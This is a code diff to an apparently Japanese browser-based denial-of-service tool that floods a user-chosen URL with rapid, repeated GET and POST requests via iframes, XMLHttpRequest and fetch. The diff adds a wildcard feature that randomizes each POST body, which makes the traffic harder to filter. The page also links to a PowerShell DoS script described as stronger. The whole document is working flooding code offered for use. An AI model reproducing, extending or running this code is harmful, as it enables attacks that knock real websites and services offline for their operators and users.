@@ -25,13 +25,66 @@
 	var xhr = new XMLHttpRequest();
 	var xhr2 = new XMLHttpRequest();
 	var count = "30";
+
+	//変数の一斉定義(boonv3.7から流用)--------------------------------------------
+
+var i,iwc,wch;
+var pp=0,qq=0;
+var wic=0;
+var tln1=0,tln2=0,tln3=0,tln4=0,tln5=0,tln6=0;
+var ack3=0,ack6=0;
+// ワイルドカード設定
+var randomCards0="*,$,@,+,<,>,!,(,)".split(",");
+var string0="0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".split(",");
+var string1=new Array();
+var alphabet0=new Array();
+var alphabet1=new Array();
+var alphabet2=new Array();
+var number0=new Array();
+var number1=new Array();
+var number2=new Array();
+
+for(i=0;i<52;++i){
+	alphabet0[i]=string0[i+10];
+}
+for(i=0;i<26;++i){
+	alphabet1[i]=string0[i+10];
+	alphabet2[i]=string0[i+36];
+}
+for(i=0;i<10;++i){
+	string1[i]=string0[i];
+	number0[i]=string0[i];
+	number1[i]=string0[i];
+	number2[i]=string0[i];
+}
+for(i=10;i<16;++i){
+	number1[i]=string0[i];
+	number2[i]=string0[i+26];
+}
+for(i=10;i<36;++i){
+	string1[i]=string0[i+26];
+}
+// ここまで--------------------------------------
+
 	function main()
 	{
 		m_inInterval = document.m_form1.m_tbInterval.value;
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
 		postdata_from_user = document.m_form1.postdata_from_user.value;
-
+		
+		//wildcard処理---------------------------------
+		if(document.m_form1.wcc.checked){wch=1}else{wch=0};
+		var tlt=postdata_from_user.split(/\r\n|\r|\n/);
+		tl = new Array;
+		for(tlc=0;tlc<tlt.length;tlc++){
+				if(tlt[tlc]=="" || tlt[tlc].match(/^\s|^\r/)){}	// 正直適当だったりする。
+				else{
+					tl.push(tlt[tlc]);
+				}
+			}
+			//ここまで--------------------------------------
+		
 		for(i = 0; i < m_ifFrame.length; i++)
 		{
 			try
@@ -60,7 +113,13 @@
 				document.all.m_dvMado.appendChild(m_ifFrame[i]);
 			}
 			m_inCount = 0;
-			m_toDoing = setTimeout("goBomb()", m_inInterval);
+
+			if(wch==0){
+			m_toDoing = setTimeout("goBomb_nowild()", m_inInterval);
+			}
+			else {
+				m_toDoing = setTimeout("goBomb()", m_inInterval);
+			}
 		}
 	}
 
@@ -75,20 +134,47 @@
 			postdata = postdata_from_user;
 			//XMLHttpRequest_GET
 			xhr2.open(method2, bomb, async);
-	    		xhr2.setRequestHeader("Pragma", "no-cache");
+	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  			xhr2.send();
 			m_ifFrame[i].setAttribute("src", bomb);
-      			//XMLHttpRequest_POST
+      //XMLHttpRequest_POST
+			xhr.open(method, bomb, async);
+			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			xhr.send((convurl(1)));
+
+		}
+		bombCounter();
+		m_toDoing = setTimeout("goBomb()", m_inInterval);
+	}
+
+	function goBomb_nowild()
+	{
+		var bomb;
+		var postdata;
+        
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb = m_stBomburl;
+			postdata = postdata_from_user;
+			//XMLHttpRequest_GET
+			xhr2.open(method2, bomb, async);
+	    xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+ 			xhr2.send();
+			m_ifFrame[i].setAttribute("src", bomb);
+      //XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			xhr.send(postdata);
 
 		}
 		bombCounter();
-		m_toDoing = setTimeout("goBomb()", m_inInterval);
+		m_toDoing = setTimeout("goBomb_nowild()", m_inInterval);
 	}
 
 	function main_XML()
@@ -97,8 +183,25 @@
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
 		postdata_from_user = document.m_form1.postdata_from_user.value;
+		//wildcard処理---------------------------------
+		if(document.m_form1.wcc.checked){wch=1}else{wch=0};
+		var tlt=postdata_from_user.split(/\r\n|\r|\n/);
+		tl = new Array;
+		for(tlc=0;tlc<tlt.length;tlc++){
+				if(tlt[tlc]=="" || tlt[tlc].match(/^\s|^\r/)){}	// 正直適当だったりする。
+				else{
+					tl.push(tlt[tlc]);
+				}
+			}
+			//ここまで--------------------------------------
 		m_inCount = 0;
-		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+
+		if(wch==0){
+			m_toDoing_XML = setTimeout("goBomb_XML_nowild()", m_inInterval);
+		}
+		else {
+			m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+		}
 	}
 
 	function goBomb_XML()
@@ -111,7 +214,31 @@
 			bomb = m_stBomburl
 			postdata = postdata_from_user
 			xhr2.open(method2, bomb, async);
-	  	  	xhr2.setRequestHeader("Pragma", "no-cache");
+	  	xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+ 			xhr2.send();
+ 			//XMLHttpRequest_POST
+			xhr.open(method, bomb, async);
+			xhr.setRequestHeader("Content-Type", "application/json;charset=utf-8");
+			xhr.send((convurl(1)));
+		}
+		bombCounter();
+		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+	}
+
+	function goBomb_XML_nowild()
+	{
+		var bomb;
+		var postdata;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			//XMLHttpRequest
+			bomb = m_stBomburl
+			postdata = postdata_from_user
+			xhr2.open(method2, bomb, async);
+	  	xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
@@ -122,8 +249,8 @@
 			xhr.send(postdata);
 		}
 		bombCounter();
-		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
-	}
+		m_toDoing_XML = setTimeout("goBomb_XML_nowild()", m_inInterval);
+	}	
 
 	function main_fetch()
 	{
@@ -131,8 +258,27 @@
 		m_inWinNum = document.m_form1.m_tbWinNum.value;
 		m_stBomburl = document.m_form1.m_tbUrl.value;
 		postdata_from_user = document.m_form1.postdata_from_user.value;
+		
+		//wildcard処理---------------------------------
+		if(document.m_form1.wcc.checked){wch=1}else{wch=0};
+		var tlt=postdata_from_user.split(/\r\n|\r|\n/);
+		tl = new Array;
+		for(tlc=0;tlc<tlt.length;tlc++){
+				if(tlt[tlc]=="" || tlt[tlc].match(/^\s|^\r/)){}	// 正直適当だったりする。
+				else{
+					tl.push(tlt[tlc]);
+				}
+			}
+			//ここまで--------------------------------------
+		
 		m_inCount = 0;
-		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+
+		if(wch==0) {
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
+		}
+		else {
+			m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+		}
 	}
 
 	function goBomb_fetch()
@@ -147,13 +293,32 @@
 			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
 			fetch(req);
 			//fech POST
-			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
 			fetch(req2);
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
 	}
 	
+	function goBomb_fetch_nowild()
+	{
+		var bomb;
+		var postdata;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb = m_stBomburl
+			postdata = postdata_from_user;
+			//fetch GET
+			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
+	}
+
 	async function stopBomb_fetch()
 	{
 		clearTimeout(m_toDoing_fetch);
@@ -185,7 +350,143 @@
 		stInfoTmp += m_stBomburl;
 		document.all.m_taInfo.value = stInfoTmp;
 	}
-//-->
+
+//convurl(boonv3.7から流用)---------------------------------------------
+
+function convurl(pss){
+	if(pss==0){				// pss==0 訪問先確認用
+		if(tln1 >= tl.length){
+			tln1=0;
+		}
+		if(/*document.x.wcc.checked*/wcc==1){	// ワイルドカードの使用のチェックをすぐに反映させられる
+			urlconv1=randomString1(tl[tln1]);
+		}else{
+			urlconv1=tl[tln1];
+		}
+		++tln1;
+		return urlconv1;
+	}else if(pss==1){
+		if(tln1 >= tl.length){
+			tln1=0;
+		}
+		if(wch==1){
+			urlconv1=randomString1(tl[tln1]);
+		}else{
+			urlconv1=tl[tln1];
+		}
+		++tln1;
+		return urlconv1;
+	}else if(pss==2){
+		if(tln2 >= tl.length){
+			tln2=0;
+		}
+		if(wch==1){
+			urlconv2=randomString1(tl[tln2]);
+		}else{
+			urlconv2=tl[tln2];
+		}
+		++tln2;
+		return urlconv2;
+	}else if(pss==3){
+		if(tln3 >= tl.length){
+			tln3=0;
+		}
+		if(wch==1){
+			urlconv3=randomString1(tl[tln3]);
+		}else{
+			urlconv3=tl[tln3];
+		}
+		++tln3;
+		return urlconv3;
+	}else if(pss==4){
+		if(tln4 >= tl.length){
+			tln4=0;
+		}
+		if(wch==1){
+			urlconv4=randomString1(tl[tln4]);
+		}else{
+			urlconv4=tl[tln4];
+		}
+		++tln4;
+		return urlconv4;
+	}else if(pss==5){
+		if(tln5 >= tl.length){
+			tln5=0;
+		}
+		if(wch==1){
+			urlconv5=randomString1(tl[tln5]);
+		}else{
+			urlconv5=tl[tln5];
+		}
+		++tln5;
+		return urlconv5;
+	}else if(pss==6){
+		if(tln6 >= tl.length){
+			tln6=0;
+		}
+		if(wch==1){
+			urlconv6=randomString1(tl[tln6]);
+		}else{
+			urlconv6=tl[tln6];
+		}
+		++tln6;
+		return urlconv6;
+	}else{					// urlconv(1)の1を忘れても一応動くようにする。スクリプト拡張用補助。
+		if(tln1 >= tl.length){
+			tln1=0;
+		}
+		if(wch==1){
+			urlconv1=randomString1(tl[tln1]);
+		}else{
+			urlconv1=tl[tln1]
+		}
+		++tln1;
+		return urlconv1;
+	}
+}
+
+//ここまで---------------------------------------------------------
+
+// ワイルドカード部分(boonv3.7から流用)-------------------------------------------------
+// IMG砲1.0を(勝手に)改造。
+
+function randomString1(original){
+	var char1="",original2="";
+	var original1=original.replace(/\[(\d+)-(\d+)\]/g,convurlrandom);
+	var length1=original1.length;
+	for(iwc=0;iwc<length1;++iwc){
+		char1 = original1.charAt(iwc);
+		if(char1=="\\"){
+			ctmp=original1.charAt(iwc+1);
+			original2 +=ctmp;
+			++iwc;		//次の文字を無視
+		}else{
+			if(char1==randomCards0[0]) char1=string0[random1(62)];
+			if(char1==randomCards0[1]) char1=alphabet0[random1(52)];
+			if(char1==randomCards0[2]) char1=string0[random1(36)];
+			if(char1==randomCards0[3]) char1=string1[random1(36)];
+			if(char1==randomCards0[4]) char1=alphabet1[random1(26)];
+			if(char1==randomCards0[5]) char1=alphabet2[random1(26)];
+			if(char1==randomCards0[6]) char1=number0[random1(10)];
+			if(char1==randomCards0[7]) char1=number1[random1(16)];
+			if(char1==randomCards0[8]) char1=number2[random1(16)];
+			original2 +=char1;
+		}
+	}
+	return original2;
+}
+
+function random1(len1){
+	if(!(0<len1)) len1=10;
+	return Math.floor(Math.random()*len1)% len1;
+}
+
+function convurlrandom(sbody,rndtmp1,rndtmp2){
+	return Math.floor(Math.random()*(Number(rndtmp2)-Number(rndtmp1)+1))+Number(rndtmp1);
+}
+
+//ここまで-----------------------------------------------------
+
 </script>
 
 </head>
@@ -242,7 +543,7 @@
 ※ただしスループットは低いです。
 <br>
 <a href="https://github.com/rifurekusyon/Powershell_DoS_Script">Powershell版の田代はこちら</a>
-※さらに強力です。
+※さらに強力です。(Windows限定)
 <br>
 <b>[この田代の性能]</b>
 <br>
@@ -254,10 +555,12 @@
 <input class="css-button-rounded--black" type="text" name="m_tbUrl" size=60 value="https://www.google.com"><br>
 <br>
 【POSTデータ】<br>
-開始2(XML)や開始3(fetch)では次のデータをサーバにPOSTできます。json形式で記入してください。<br>ダブルクオーテーションは使用しないでください。<br>
+開始2(XML)や開始3(fetch)では次のデータをサーバにPOSTできます。json形式で記入してください。<br>また、下記のワイルドカードを使用できます。使う場合は□にチェックを入れてください。<br>※ワイルドカード機能を使うと少し速度が低下します。<br>(ワイルドカードとは、ワイルドカードの文字(*や!など)を訪問時にランダムな文字に置き換える機能です。)<br>※ダブルクオーテーションは使用しないでください。<br>
 よくわからない場合は変更する必要はありません。<br>
 <input class="css-button-rounded--black" type="text" name="postdata_from_user" size="50" value="{'name':'nanashi', 'comment':'qawsedrftgyhujikolp'}"><br>
-<br>
+Wildcard:<input type="checkbox" name="wcc" title="チェックでワイルドカードを使用します。">
+<span class="wi">*=$or!, $=&lt;or&gt;, @=&lt;or!, +=&gt;or!, &lt;=a-z, &gt;=A-Z, !=0-9, (=0-f, )=0-F, [0-1]=0-1, \\=bypass</span>
+<br><br>
 【更新間隔】（1/1000秒　2秒間隔で撃つ場合 2000に）<br>
 <input class="css-button-rounded--black" type="text" size="10" name="m_tbInterval" value="120"><br>
 <br>
